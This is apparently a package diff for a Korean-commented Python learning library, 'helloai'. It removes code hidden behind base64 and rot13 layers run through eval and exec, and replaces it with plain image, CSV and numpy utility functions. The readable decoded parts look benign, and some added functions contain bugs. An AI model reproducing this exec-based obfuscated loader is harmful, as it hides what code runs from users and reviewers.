c2h1ZmZsZScsICducGFycmF5JywgJ3RvYXJyYXknLCAndG9saXN0JywgCiAgICAgICAgICAgJ3Jlc2hhcGUnXQoKCiMgaHR0cHM6Ly9zY2lraXQtbGVhcm4ub3JnL3N0YWJsZS9tb2R1bGVzL2dlbmVyYXRlZC9za2xlYXJuLnByZXByb2Nlc3NpbmcuTWluTWF4U2NhbGVyLmh0bWwKZGVmIG5vcm1hbGl6KGRhdGEsIHNjYWxlcj0nbWlubWF4Jyk6CiAgICBpZiBpc2luc3RhbmNlKGRhdGEsIGxpc3QpOgogICAgICAgIGRhdGEgPSBucC5hcnJheShkYXRhKQogICAgZWxpZiBpc2luc3RhbmNlKGRhdGEsIG5wLm5kYXJyYXkpOgogICAgICAgIHBhc3MKICAgIGVsc2U6CiAgICAgICAgcmV0dXJuIGRhdGEKCiAgICBpZiBzY2FsZXIgPT0gJ21pbm1heCc6CiAgICAgICAgIyBzY2FsZWRfZGF0YSA9IG1pbm1heF9zY2FsZShkYXRhLCBheGlzPTAsIGNvcHk9VHJ1ZSkKICAgICAgICBzY2FsZWRfZGF0YSA9IChkYXRhIC0gZGF0YS5taW4oYXhpcz0wKSkgLyAoZGF0YS5tYXgoYXhpcz0wKSAtIGRhdGEubWluKGF4aXM9MCkpCiAgICAgICAgcmV0dXJuIHNjYWxlZF9kYXRhCiAgICBlbGlmIHNjYWxlciA9PSAnaW1hZ2UnOgogICAgICAgIHJldHVybiBkYXRhLmFzdHlwZSgnZmxvYXQzMicpIC8gMjU1LgogICAgZWxzZToKICAgICAgICByZXR1cm4gZGF0YQoKCmRlZiBsb2FkX2ltYWdlKGZpbGVuYW1lKToKICAgIGZyYW1lID0gTm9uZQogICAgaXNXZWIgPSBGYWxzZQogICAgCiAgICBpZiAocmUubWF0Y2gocidcdys6Ly8nLCBmaWxlbmFtZSkpOgogICAgICAgICMg7Ju57IOB7J2YIOydtOuvuOyngCAKICAgICAgICB3aXRo'
-love = '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'
-god = 'YXRhc2V0KSkKICAgICMgcHJpbnQoJ+2MjOydvOydhCDsoIDsnqXtlZjsmIDsirXri4jri6QnLCBwYXRoKQoKCmRlZiBsb2FkX25weShmaWxlX25hbWUpOgogICAgIiIiCiAgICBucHnroZwg7KCA7J6l7ZWcIO2MjOydvCDsnb3quLAKICAgICIiIgogICAgZGF0YSA9IG5wLmxvYWQoZmlsZV9uYW1lLCBhbGxvd19waWNrbGU9VHJ1ZSkuaXRlbSgpCiAgICBwcmludChmaWxlX25hbWUsICftjIzsnbzsnbQg66Gc65Oc65CY7JeI7Iq164uI64ukJykKICAgIHJldHVybiBkYXRhCgoKZGVmIGxpc3RfY29uY2F0ZW5hdGUoeCwgKmFyZ3MpOgogICAgcmV0dXJuIG5wLmNvbmNhdGVuYXRlKCh4LCAqYXJncyksIGF4aXM9MCkKCmRlZiBjb25jYXRlbmF0ZShkYXRhLCBheGlzPTApOgogICAgZGF0YSA9IG5wLmNvbmNhdGVuYXRlKGRhdGEsIGF4aXM9YXhpcykKICAgIHByaW50KCdAY29uY2F0ZSB0eXBlJywgdHlwZShkYXRhKSwgbGVuKGRhdGEpKQogICAgcmV0dXJuIGRhdGEKCmRlZiBzYXZlX2RhdGFzZXQocGF0aCwgZGF0YXNldCk6CiAgICBzYXZlX25weShwYXRoLCBkYXRhc2V0KQoKZGVmIGxvYWRfZGF0YXNldChwYXRoKToKICAgIHJldHVybiBucC5sb2FkKHBhdGgsIGFsbG93X3BpY2tsZT1UcnVlKS5pdGVtKCkKCmRlZiBvbmVfaG90KGxhYmVscywgZGF0YSk6CiAgICB5X3RyYWluID0gW10KICAgIGV5ZXMgPSBucC5leWUobGVuKGxhYmVscykpICAgICAgICAKICAgIGZvciBsYmwgaW4gZGF0YToKICAgICAgICBpZHggPSBsYWJlbHMuaW5kZXgobGJsKQogICAgICAgIHlfdHJhaW4uYXBwZW5kKGV5ZXNbaWR4XSkKICAgIHJldHVybiBucC5hcnJheSh5X3RyYWluKQogICAgCgojIDLssKjsm5Ag67Cw7Je07JeQ7IScIGJvdWRpbmdib3gg6rWs7ZWY6riwIAojW1sxLDJdLCBbMiwzXSwgWzMsNF1dCmRlZiBib3VuZGluZ19ib3gobG1rcyk6CiAgICBiYiA9IG5wLmFycmF5KFtucC5taW4obG1rcywgYXhpcz0wKSwgbnAubWF4KGxta3MsIGF4aXM9MCldKQogICAgcmV0dXJuIGJiCgpkZWYgcmVzaGFwZShkYXRhLCBzaGFwZSk6CiAgICBpZiBpc2luc3RhbmNlKGRhdGEsIGxpc3QpOgogICAgICAgIGRhdGEgPSBucC5hcnJheShkYXRhKQogICAgICAgIGRhdGEgPSBucC5yZXNoYXBlKGRhdGEsIHNoYXBlKQogICAgICAgIAogICAgaWYgaXNpbnN0YW5jZShkYXRhLCBucC5uZGFycmF5KToKICAgICAgICBkYXRhID0gbnAucmVzaGFwZShkYXRhLCBzaGFwZSkKICAgIHJldHVybiBkYXRhCgpkZWYgZmxhdHRlbihsbWtzKToKICAgIHJldHVybiBsbWtzLmZsYXR0ZW4oKQoKIyBodHRwczovL3JmcmllbmQudGlzdG9yeS5jb20vMjUyCmRlZiBzYXZlX2NzdihmaWxlbmFtZSwgZGF0YSwgc2VwPScgJywgaGVhZGVyPU5vbmUpOgogICAgaWYgaXNpbnN0YW5jZShkYXRhLCBsaXN0KToKICAgICAgICBkYXRhID0gbnAuYXJyYXkoZGF0YSkKCiAgICBpZiBpc2luc3RhbmNlKGRhdGEsIG5wLm5kYXJyYXkpOgogICAgICAgIGRhdGEgPSBwZC5EYXRhRnJhbWUoZGF0YSkKICAgIAogICAgaWYgaGVhZGVyOgogICAgICAgIGRhdGEudG9fY3N2KAogICAgICAgICAgICBmaWxlbmFtZSwKICAgICAgICAgICAgc2VwPXNlcCwKICAgICAgICAgICAgbmFfcmVwPSdO'
-destiny = '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'
-joy = '\x72\x6f\x74\x31\x33'
-trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
-eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# -----------------------------------------------------------------------------
+# Copyright (c) 2021- HelloAI Project Contributors
+# -----------------------------------------------------------------------------
+import io
+import re
+import urllib
+import numpy as np
+import pandas as pd 
+import cv2
+import PIL.Image as pImage
+# import random as rand
+import os
+import pprint as pp
+import vnoise
+
+from helloai.core.image import Image 
+# from sklearn.preprocessing import MinMaxScaler
+from sklearn.preprocessing import minmax_scale
+
+
+__all__ = ['load_image', 'read_image', 'map', 'pprint', 'save_npy', 'load_npy', 'list_concatenate', 'concatenate', 'save_dataset', 'load_dataset',
+           'one_hot', 'bounding_box', 'flatten', 'read_csv', 'save_csv', 'shape', 'shuffle', 'nparray', 'toarray', 'tolist', 
+           'reshape']
+
+
+# https://scikit-learn.org/stable/modules/generated/sklearn.preprocessing.MinMaxScaler.html
+def normaliz(data, scaler='minmax'):
+    if isinstance(data, list):
+        data = np.array(data)
+    elif isinstance(data, np.ndarray):
+        pass
+    else:
+        return data
+
+    if scaler == 'minmax':
+        # scaled_data = minmax_scale(data, axis=0, copy=True)
+        scaled_data = (data - data.min(axis=0)) / (data.max(axis=0) - data.min(axis=0))
+        return scaled_data
+    elif scaler == 'image':
+        return data.astype('float32') / 255.
+    else:
+        return data
+
+
+def load_image(filename):
+    frame = None
+    isWeb = False
+    
+    if (re.match(r'\w+://', filename)):
+        # 웹상의 이미지 
+        with urllib.request.urlopen(filename) as url:
+            f = io.BytesIO(url.read())
+            pil_image = pImage.open(f)
+            frame = np.array(pil_image)
+            isWeb = True
+    else:
+        frame = cv2.imread(filename)
+
+    if isWeb:
+        return Image(cv2.cvtColor(frame, cv2.COLOR_RGB2BGR), 'bgr')
+    else:
+        return Image(frame, 'bgr')
+
+
+def read_image(filename):
+    return load_image(filename, colorspace)
+    
+
+#vnoise를 이용한 perlin노이즈 
+# def noise(x, y=None, z=None):
+#     n = vnoise.Noise()
+#     if y == None:
+#         return map(n.noise1(x), -0.5, 0.5, 0, 1)
+#     elif z == None:
+#         return map(n.noise2(x, y), -0.5, 0.5, 0, 1)
+#     else:
+#         return map(n.noise3(x, y, z), -0.5, 0.5, 0, 1)
+
+def map(x, in_min, in_max, out_min, out_max):
+    return (x - in_min) * (out_max - out_min) / (in_max - in_min) + out_min
+
+def pprint(object, stream=None, indent=4, width=80, depth=None):
+    """Pretty-print a Python object to a stream [default is sys.stdout]."""
+    printer = pp.PrettyPrinter(stream=stream, indent=indent, width=width, depth=depth)
+    printer.pprint(object)
+
+
+# def get_file_list(path=None):
+#     base_path = path
+#     files = sorted(os.listdir(base_path))
+#     file_list = []
+#     for f in files:
+#         f = os.path.join(base_path, f)
+#         file_list.append(f)
+#     return file_list
+
+
+def mkdir(path):
+    if not os.path.isdir(path):
+        os.mkdir(path)
+
+
+def save_npy(path, dataset):
+    """
+    numpy 파일로 저장
+    """
+    head_tail = os.path.split(path)
+    mkdir(head_tail[0])
+    np.save(path, np.array(dataset))
+    # print('파일을 저장하였습니다', path)
+
+
+def load_npy(file_name):
+    """
+    npy로 저장한 파일 읽기
+    """
+    data = np.load(file_name, allow_pickle=True).item()
+    print(file_name, '파일이 로드되었습니다')
+    return data
+
+
+def list_concatenate(x, *args):
+    return np.concatenate((x, *args), axis=0)
+
+def concatenate(data, axis=0):
+    data = np.concatenate(data, axis=axis)
+    print('@concate type', type(data), len(data))
+    return data
+
+def save_dataset(path, dataset):
+    save_npy(path, dataset)
+
+def load_dataset(path):
+    return np.load(path, allow_pickle=True).item()
+
+def one_hot(labels, data):
+    y_train = []
+    eyes = np.eye(len(labels))        
+    for lbl in data:
+        idx = labels.index(lbl)
+        y_train.append(eyes[idx])
+    return np.array(y_train)
+    
+
+# 2차원 배열에서 boudingbox 구하기 
+#[[1,2], [2,3], [3,4]]
+def bounding_box(lmks):
+    bb = np.array([np.min(lmks, axis=0), np.max(lmks, axis=0)])
+    return bb
+
+def reshape(data, shape):
+    if isinstance(data, list):
+        data = np.array(data)
+        data = np.reshape(data, shape)
+        
+    if isinstance(data, np.ndarray):
+        data = np.reshape(data, shape)
+    return data
+
+def flatten(lmks):
+    return lmks.flatten()
+
+# https://rfriend.tistory.com/252
+def save_csv(filename, data, sep=' ', header=None):
+    if isinstance(data, list):
+        data = np.array(data)
+
+    if isinstance(data, np.ndarray):
+        data = pd.DataFrame(data)
+    
+    if header:
+        data.to_csv(
+            filename,
+            sep=sep,
+            na_rep='NaN', 
+            float_format = '%.2f', # 2 decimal places
+            columns = header, # columns to write
+            index = False  # do not write index
+        ) 
+    else:
+        data.to_csv(
+            filename,
+            header=False,
+            columns=None,
+            sep=sep,
+            na_rep='NaN', 
+            float_format = '%.2f', # 2 decimal places
+            index = False  # do not write index
+        ) 
+    # print(filename, '을 저장하였습니다')
+
+# https://chrisjune-13837.medium.com/python-%EA%B0%80%EB%B3%80%EC%9D%B8%EC%9E%90-%ED%8C%A8%ED%82%B9-%EC%96%B8%ED%8C%A8%ED%82%B9-a47ee2cdcac3
+def read_csv(filename, **kwargs):
+    df = pd.read_csv(filename, **kwargs)
+    return df.to_numpy()
+
+def shape(data):
+    if isinstance(data, list):
+        return np.array(data).shape
+    elif isinstance(data, np.ndarray):
+        return data.shape
+    elif isinstance(data, Image):
+        return data.shape()
+    else:
+        return None
+
+
+def shuffle(x_data, y_data):
+    np.random.seed(777)
+    if not isinstance(x_data):
+        x_data = np.array(x_data)
+
+    if not isinstance(y_data):
+        y_data = np.array(y_data)
+
+    index = np.arange(len(x_data))
+    np.random.shuffle(index)
+    return x_data[index], y_data[index]
+
+# ndarray로 바꿔서 반환      
+def nparray(data):
+    if isinstance(data, list):
+        return np.array(data)
+    elif isinstance(data, Image):
+        return data.array
+    return data
+
+
+def toarray(data):
+    return nparray(data)
+
+
+def tolist(data):
+    if isinstance(data, np.ndarray):
+        return data.tolist()
+    return data
```

### encoding

```diff
@@ -1 +1 @@
-us-ascii
+utf-8
```

## helloai/core/core.py

```diff
@@ -1,8 +1,326 @@
-import base64, codecs
-magic = 'aW1wb3J0IF9fbWFpbl9fDQppbXBvcnQgb3MNCmltcG9ydCBzeXMNCmltcG9ydCBidWlsdGlucw0KaW1wb3J0IHRpbWUNCmltcG9ydCBtYXRoIA0KIyBmcm9tIHRocmVhZGluZyBpbXBvcnQgRXZlbnQsIFRocmVhZA0KaW1wb3J0IGN2Mg0KaW1wb3J0IGtleWJvYXJkDQoNCmZyb20gdGhyZWFkaW5nIGltcG9ydCBUaHJlYWQNCiAgDQpmcm9tIC5zaW5nbGVzdG9yZSBpbXBvcnQgU2luZ2xlU3RvcmUNCmZyb20gLmNvbG9ycyBpbXBvcnQgQ29sb3INCg0KX19hbGxfXyA9IFsnbG9vcCcsICdzZXR1cCcsICdydW4nLCAnd2FpdF9rZXknLCAna2V5X3ByZXNzZWQnLCAnZGVsYXknLCAnZnJhbWVfcmF0ZScsICdzaXplJywgJ25vbG9vcCddDQoNCktFWV9UQUJMRSA9IFsNCiAgICAnbnVsJywgJ3NvaCcsICdzdHgnLCAnZXR4JywgJ2VvdCcsICdlbnEnLCAnYWNrJywgJ2JlbCcsICdicycsICd0YWInLCAnbGYnLCAndnQnLCAnZmYnLCAnY3InLCAnc28nLCAnc2knLCAnZGxlJywNCiAgICAnZGMxJywgJ2RjMicsICdkYzMnLCAnZGM0JywgJ25haycsICdzeW4nLCAnZXRiJywgJ2NhbicsICdlbScsICdzdWInLCAnZXNjJywgJ2ZzJywgJ2dzJywgJ3JzJywgJ3VzJywgJ3NwYWNlJywgJyEnLA0KICAgICciJywgJyMnLCAnJCcsICclJywgJyYnLCAnXCcnLCAnKCcsICcpJywgJyonLCAnKycsICcsJywgJy0nLCAnLicsICcvJywgJzAnLCAnMScsICcyJywgJzMnLCAnNCcsICc1JywgJzYnLCAnNycsDQogICAgJzgnLCAnOScsICc6JywgJzsnLCAnPCcsICc9JywgJz4nLCAnPycsICdAJywgJ0EnLCAnQicsICdDJywgJ0QnLCAnRScsICdGJywgJ0cnLCAnSCcsICdJJywgJ0onLCAnSycsICdMJywgJ00nLCAnTicsDQogICAgJ08nLCAnUCcsICdRJywgJ1InLCAnUycsICdUJywgJ1UnLCAnVicsICdXJywgJ1gnLCAnWScsICdaJywgJ1snLCAnXFwnLCAnXScsICdeJywgJ18nLCAnYCcsICdhJywgJ2InLCAnYycsICdkJywgJ2UnLA0KICAgICdmJywgJ2cnLCAnaCcsICdpJywgJ2onLCAnaycsICdsJywgJ20nLCAnbCcsICdvJywgJ3AnLCAncScsICdyJywgJ3MnLCAndCcsICd1JywgJ3YnLCAndycsICd4JywgJ3knLCAneicsICd7JywgJ3wnLA0KICAgICd9JywgJ34nLCAnZGVsJw0KXQ0KDQoNCmxvb3BfZmxhZyA9IFRydWUNCm5vbG9vcF9mbGFnID0gRmFsc2UNCg0Kc2V0dXBfbWV0aG9kID0gTm9uZQ0KbG9vcF9tZXRob2QgPSBOb25lDQprZXlfcHJlc3NlZF9tZXRob2QgPSBOb25lDQptb3VzZV9ldmVudF9tZXRob2QgPSBOb25lDQojIGNhbmNlbF9mdXR1cmVfY2FsbHMgPSBOb25lDQptb3VzZV9kb3duX3RpbWUgPSB0aW1lLnRpbWUoKQ0KDQpsb29wX2ZyYW1lX3JhdGUgPSA2MA0Kc2luZ2xlX3N0b3JlID0gU2luZ2xlU3RvcmUoKQ0KYnVpbHRpbnMubW91c2VfZXZlbnQgPSBOb25lDQoNCiMg7KCE7JetIOywuOyhsA0KYnVpbHRpbnMubW91c2VfeCA9IDANCmJ1aWx0aW5zLm1vdXNlX3kgPSAwDQpidWlsdGlucy5wbW91c2VfeCA9IDANCmJ1aWx0aW5zLnBtb3VzZV95ID0gMA0KYnVpbHRpbnMuZnBzID0gMA0KDQpidWlsdGlucy5tb3VzZV9wcmVzc2VkID0gRmFsc2UNCg0KYnVpbHRpbnMuV0lEVEggPSA2NDAgDQpidWlsdGlucy5IRUlHSFQgPSA0ODAgDQpidWlsdGlucy5DT0xPUiA9IENvbG9yLkRFRkFVTFQNCg0KYnVpbHRpbnMud2luZG93cyA9IFtdDQoNCnByZXZfdGltZSA9IDANCg0KDQoNCg0KDQpkZWYgX19wdXRfZnBzKCk6DQogICAgZ2xvYmFsIHByZXZfdGltZQ0KDQogICAgY3VyX3RpbWUgPSB0aW1lLnRpbWUoKQ0KICAgIHNlYyA9IGN1cl90aW1lIC0gcHJldl90aW1lDQogICAgcHJldl90aW1lID0gY3VyX3RpbWUNCiAgICBmcHNfdmFsID0gMS8oc2VjKQ0KICAgIGZwc192YWwgPSByb3VuZChmcHNfdmFsKQ0KICAgIGJ1aWx0aW5zLmZwcyA9IGZwc192YWwNCiAgICAjIGZwc190eHQgPSAiJTAxLmYiICUgZnBzX3ZhbA0KICAgIA0KZGVmIGJ5ZSgpOg0KICAgIGdsb2JhbCBsb29wX2ZsYWcNCiAgICBsb29wX2ZsYWcgPSBGYWxzZQ0KICAgICMgZGVsYXkoMSkNCiAgICAjIGlmIGxlbihidWlsdGlucy53aW5kb3dzKSA+IDA6DQogICAgIyAgICAgYnVpbHRpbnMud2luZG93cyA9IFtdDQogICAgIyAgICAgY3YyLmRlc3Ryb3lBbGxXaW5kb3dzKCkNCiAgICAjIHByaW50KGJ1aW'
-love = 'k0nJ5mYaqcozEiq3ZcQDbtVPNtVlOzo3VtozSgMFOcovOvqJyfqTyhpl53nJ5xo3qmBt0XVPNtVPZtVPNtVTA2Zv5xMKA0pz95I2yhMT93XT5uoJHcQDbtVPNtLaIcoUEcoaZhq2yhMT93plN9VSgqQDbtVPNtL3LlYzEyp3Elo3yOoTkKnJ5xo3qmXPxAPvNtVPOjpzyhqPtaK19vrJIsKlpcQDbtVPNtMKucqPtcQDbAPt0XMTIzVTAuoTkspzIjMJS0MJEfrFucoaEypaMuoPjtMaIhLljtXzSlM3ZcBt0XVPNtVUA0o3OjMJDtCFOSqzIhqPtcQDbAPvNtVPOxMJLtoT9ipPtcBt0XVPNtVPNtVPO3nTyfMFOho3Dtp3EipUOyMP53LJy0XTyhqTIlqzSfXGbtVPNwVUEbMFOznKWmqPOwLJkfVTymVTyhVTOcoaEypaMuoTNtp2Iwpj0XVPNtVPNtVPNtVPNtMaIhLltdLKWaplxAPvNtVPOHnUWyLJDbqTSlM2I0CJkio3NcYaA0LKW0XPxAPvNtVPOlMKE1pz4tp3EipUOyMP5mMKDAPt0XQDcxMJLtp2y6MFu3nJE0nPjtnTIcM2u0XGbAPvNtVPOvqJyfqTyhpl5KFHEHFPN9VUqcMUEbVN0XVPNtVTW1nJk0nJ5mYxuSFHqVIPN9VTuynJqbqPNAPt0XMTIzVUAyqUIjXPx6QDbtVPNtpTSmpj0XQDbAPzEyMvOfo29jXPx6QDbtVPNtpTSmpj0XQDbAPzEyMvOeMKyspUWyp3AyMPueMKxcBt0XVPNtVTyzVTgyrFN9CFNaMKAwWlOipvOeMKxtCG0tW3RaVT9lVTgyrFN9CFNaHFp6QDbtVPNtVPNtVUOlnJ50XPqsK2gyrI9sWljtn2I5XD0XVPNtVPNtVPOvrJHbXD0XQDbAPzEyMvOsK2gyrI9jpzImp2IxXTgyrFx6QDbtVPNtVlOjpzyhqPtaK19eMKyspUWyp3AyMPpcBj0XVPNtVTyzVTgyrFN9CFNaMKAwWlOipvOeMKxtCG0tW3RaVT9lVTgyrFN9CFNaHFp6QDbtVPNtVPNtVPZt7MFR66Tp6er4656b7WrD7VFpVBlvurhwwPQffcwecdmecojt7MJL64+R66TqVB2IgBlxtBhYcN0XVPNtVPNtVPOcMvOeMKyspUWyp3AyMS9gMKEbo2D6QDbtVPNtVPNtVPNtVPOeMKyspUWyp3AyMS9gMKEbo2Dbn2I5XD0XVPNtVPNtVPOvrJHbXD0XQDbtVPNtMJkmMGbAPvNtVPNtVPNtnJLtn2I5K3OlMKAmMJEsoJI0nT9xBt0XVPNtVPNtVPNtVPNtn2I5K3OlMKAmMJEsoJI0nT9xXTgyrFxAPt0XQDbAPzEyMvOgo3ImMI9yqzIhqPuhLJ1yYPOyqzIhqPjtrPjtrFjtMzkuM3Z9Gz9hMFjtpTSlLJ1mCH5iozHcBt0XVPNtVTqfo2WuoPOgo3ImMI9xo3qhK3EcoJHAPvNtVPOaoT9vLJjtoJ91p2IsrN0XVPNtVTqfo2WuoPOgo3ImMI95QDbAPvNtVPOyqzIhqS9hLJ1yVQ0tGz9hMD0XVPNtVTyzVTI2MJ50VQ09VTA2Zv5SIxIBIS9ZDyIHIR9BER9KGwbAPvNtVPNtVPNtMKMyoaEsozSgMFN9VPWfMJM0YJEiq24vQDbtVPNtVPNtVTW1nJk0nJ5mYz1iqKAyK3OlMKAmMJDtCFOHpaIyQDbtVPNtVPNtVT1iqKAyK2Eiq25sqTygMFN9VUEcoJHhqTygMFtcQDbtVPNtMJkcMvOyqzIhqPN9CFOwqwVhEIMSGyEsGRWIISECGyIDBt0XVPNtVPNtVPOvqJyfqTyhpl5go3ImMI9jpzImp2IxVQ0tEzSfp2HAPvNtVPNtVPNtMTyzMvN9VUEcoJHhqTygMFtcVP0to